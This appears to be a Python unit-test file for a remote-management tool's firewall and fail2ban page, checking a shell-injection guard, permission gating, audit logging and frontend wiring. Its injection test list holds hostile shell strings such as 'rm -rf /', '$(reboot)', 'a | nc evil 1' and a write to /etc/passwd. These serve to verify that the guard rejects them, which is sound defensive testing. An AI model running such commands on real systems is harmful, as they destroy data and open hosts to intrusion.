"""v4.10.0 — Firewall + fail2ban page (visibility + edit).

Functional test of the shell-injection guard on rule specs/refs, plus wiring
assertions across the agent (collection), api.py (sanitizer, routes, RBAC gate,
command construction) and the frontend (page, loaders, sortable tables, i18n)."""
import importlib.util
import os
import re
import sys
import tempfile
import unittest
from pathlib import Path

os.environ.setdefault('RP_DATA_DIR', tempfile.mkdtemp())
_ROOT = Path(__file__).parent.parent
_CGI = _ROOT / 'server' / 'cgi-bin'
sys.path.insert(0, str(_CGI))

_spec = importlib.util.spec_from_file_location('api_v4100_fw', _CGI / 'api.py')
api = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(api)

_API_SRC = (_CGI / 'api.py').read_text()
_AGENT_SRC = (_ROOT / 'client' / 'remotepower-agent.py').read_text()
_APP_JS = (_ROOT / 'server' / 'html' / 'static' / 'js' / 'app.js').read_text()
_HTML = (_ROOT / 'server' / 'html' / 'index.html').read_text()
_I18N = (_ROOT / 'server' / 'html' / 'static' / 'js' / 'i18n.js').read_text()


class TestInjectionGuard(unittest.TestCase):
    """The rule spec/ref is interpolated into an exec: command run through a
    shell — the guard MUST reject every shell metacharacter."""

    LEGIT = [
        '-A INPUT -p tcp --dport 22 -j ACCEPT',
        'add rule inet filter input tcp dport 22 accept',
        'INPUT -p tcp --dport 22 -j ACCEPT',
        'inet filter input handle 5',
        '--add-port=8080/tcp', 'allow 443/tcp', 'port:22/tcp', 'service:ssh',
        '-A INPUT -s 192.168.1.0/24 -j DROP',
    ]
    INJECT = [
        '-A INPUT; rm -rf /', 'allow 22/tcp && curl evil', '$(reboot)', '`id`',
        'a | nc evil 1', 'x > /etc/passwd', 'a\nb', "a'b", 'a"b',
        'add {bad}', 'a&b', 'a<b', 'rule\\x', '',
    ]

    def test_legit_accepted(self):
        for s in self.LEGIT:
            self.assertTrue(api._valid_fw_token(s), f'should accept: {s!r}')

    def test_injection_rejected(self):
        for s in self.INJECT:
            self.assertFalse(api._valid_fw_token(s), f'should reject: {s!r}')

    def test_overlong_rejected(self):
        self.assertFalse(api._valid_fw_token('a' * 401))

    def test_jail_name_regex_strict(self):
        self.assertTrue(api._FW_JAIL_RE.match('sshd'))
        self.assertTrue(api._FW_JAIL_RE.match('nginx-http-auth'))
        for bad in ('ssh d', 'a;b', 'a/b', 'a$b', '`x`'):
            self.assertIsNone(api._FW_JAIL_RE.match(bad), f'jail {bad!r} should be invalid')


class TestApiWiring(unittest.TestCase):
    def test_routes_registered(self):
        self.assertIn("('GET', '/api/firewall'): handle_firewall_overview", _API_SRC)
        self.assertIn("('GET', '/api/fail2ban'): handle_fail2ban_overview", _API_SRC)
        self.assertIn("endswith('/firewall-rule') and m == 'POST'", _API_SRC)
        self.assertIn("endswith('/fail2ban-action') and m == 'POST'", _API_SRC)

    def test_handlers_exist(self):
        for fn in ('handle_firewall_overview', 'handle_fail2ban_overview',
                   'handle_device_firewall_rule', 'handle_device_fail2ban_action'):
            self.assertTrue(hasattr(api, fn), fn)

    def test_write_handlers_rbac_gated(self):
        # Both write handlers must gate on require_perm('command', [dev_id]) —
        # not bare require_auth (a viewer must not edit a host firewall).
        for fn in ('handle_device_firewall_rule', 'handle_device_fail2ban_action'):
            body = re.search(r'def %s\(dev_id\):.*?\n(?=\ndef |\n# )' % fn, _API_SRC, re.S)
            self.assertIsNotNone(body, fn)
            self.assertIn("require_perm('command', [dev_id])", body.group(0), fn)

    def test_write_handlers_audited_and_queued(self):
        for fn, action in (('handle_device_firewall_rule', 'host_firewall_rule'),
                           ('handle_device_fail2ban_action', 'fail2ban_action')):
            body = re.search(r'def %s\(dev_id\):.*?\n(?=\ndef |\n# )' % fn, _API_SRC, re.S).group(0)
            self.assertIn(f"audit_log(actor, '{action}'", body, fn)
            self.assertIn('_queue_command(dev_id', body, fn)

    def test_fail2ban_validates_ip(self):
        body = re.search(r'def handle_device_fail2ban_action\(dev_id\):.*?\n(?=\ndef |\n# )',
                         _API_SRC, re.S).group(0)
        self.assertIn('ipaddress.ip_address', body)

    def test_sanitizer_persists_rule_list_and_fail2ban(self):
        self.assertIn("sb['rule_list'] = safe_rl", _API_SRC)
        self.assertIn("safe_si['fail2ban']", _API_SRC)


class TestAgentCollection(unittest.TestCase):
    def test_parsers_and_collector_defined(self):
        for fn in ('_parse_nft_rules', '_parse_ipt_rules', '_parse_ufw_rules',
                   '_parse_firewalld_rules', 'collect_fail2ban'):
            self.assertIn(f'def {fn}(', _AGENT_SRC, fn)

    def test_fail2ban_wired_into_sysinfo(self):
        self.assertIn("out['fail2ban'] = _f2b", _AGENT_SRC)

    def test_rule_list_attached_to_backends(self):
        self.assertIn("'rule_list': _parse_nft_rules(txt)", _AGENT_SRC)
        self.assertIn("b['rule_list'] = _parse_ipt_rules(ipt_best_txt)", _AGENT_SRC)

    def test_extensionless_copy_matches(self):
        ext = (_ROOT / 'client' / 'remotepower-agent').read_text()
        self.assertEqual(ext, _AGENT_SRC, 'remotepower-agent must match the .py byte-for-byte')


class TestFrontend(unittest.TestCase):
    def test_nav_and_page(self):
        self.assertIn('data-page="firewall"', _HTML)
        self.assertIn('id="page-firewall"', _HTML)
        self.assertIn('id="firewall-tbody"', _HTML)
        self.assertIn('id="fail2ban-tbody"', _HTML)

    def test_loaders_dispatched(self):
        self.assertIn("if (name === 'firewall')   loadFirewall();", _APP_JS)
        self.assertIn('async function loadFirewall(', _APP_JS)
        self.assertIn('async function loadFail2ban(', _APP_JS)

    def test_sortable_tables_wired(self):
        self.assertIn("wireSortOnly('firewall-thead', 'firewall'", _APP_JS)
        self.assertIn("wireSortOnly('fail2ban-thead', 'fail2ban'", _APP_JS)
        # both theads carry data-col attributes
        self.assertIn('id="firewall-thead"', _HTML)
        self.assertIn('id="fail2ban-thead"', _HTML)

    def test_tables_capped(self):
        # the page's tables sit inside the scroll-capped wrapper
        seg = _HTML[_HTML.index('id="page-firewall"'):_HTML.index('id="page-risk"')]
        self.assertEqual(seg.count('scrollable-table-wrap audit-scroll'), 2, 'both tables must be capped')

    def test_i18n_entry(self):
        self.assertIn("'Firewall':", _I18N)

    def test_no_inline_handlers_or_styles(self):
        seg = _HTML[_HTML.index('id="page-firewall"'):_HTML.index('id="page-risk"')]
        self.assertNotIn('onclick=', seg)
        self.assertNotIn('style="', seg)


if __name__ == '__main__':
    unittest.main()
